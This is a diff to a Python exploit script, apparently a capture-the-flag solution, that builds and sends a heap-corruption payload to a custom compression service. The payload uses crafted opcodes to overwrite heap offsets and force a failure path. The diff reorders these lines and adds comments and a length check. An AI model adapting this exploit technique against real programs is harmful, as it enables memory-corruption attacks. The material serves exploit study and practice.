@@ -44,26 +44,24 @@ def save_cached_qword_to_comp(Q_count):  # save cache to comp
     local_payload += chr((3 << 6) | Q_count)
     return local_payload
 
-payload += save_zeros_to_comp_Q(0x3f) * 10
-payload += save_cached_qword_to_comp(0x34)
-payload += cache_qword(0x33, 1)
-payload += save_cached_qword_to_comp(0) * 56  # offset 0x1c0
-payload += save_cached_qword_to_comp(0x33)
-payload += cache_qword(0x34, 1)
-payload += chr((0 << 6) | 0x3f)  # fail fm_to_comp_Q
-
-
 """
-initial heap structure (lower is larger addr):
+initial heap structure:
 st_Compress 0x1B8
-st_Compress::buf 0x8
+st_Compress->buf 0x8
 st_FileManager 0x18
 std::ifstream 0x208
 """
 
-# final payload to send
+payload += save_zeros_to_comp_Q(0x3f) * 0x10
+payload += save_cached_qword_to_comp(0x34)
+payload += cache_qword(0x33, 1)
+payload += save_cached_qword_to_comp(0) * 0x38  # offset 0x1c0 == 0x38 * 0x8
+payload += save_cached_qword_to_comp(0x33)
+payload += cache_qword(0x34, 1)
+payload += chr((0 << 6) | 0x3f)  # fail fm_to_comp_Q
 
-payload = p32(len(payload)) + payload
+assert(len(payload) <= 4096)
+payload = p32(len(payload)) + payload  # size prefix for wrapper
 
 p.send(payload)
 
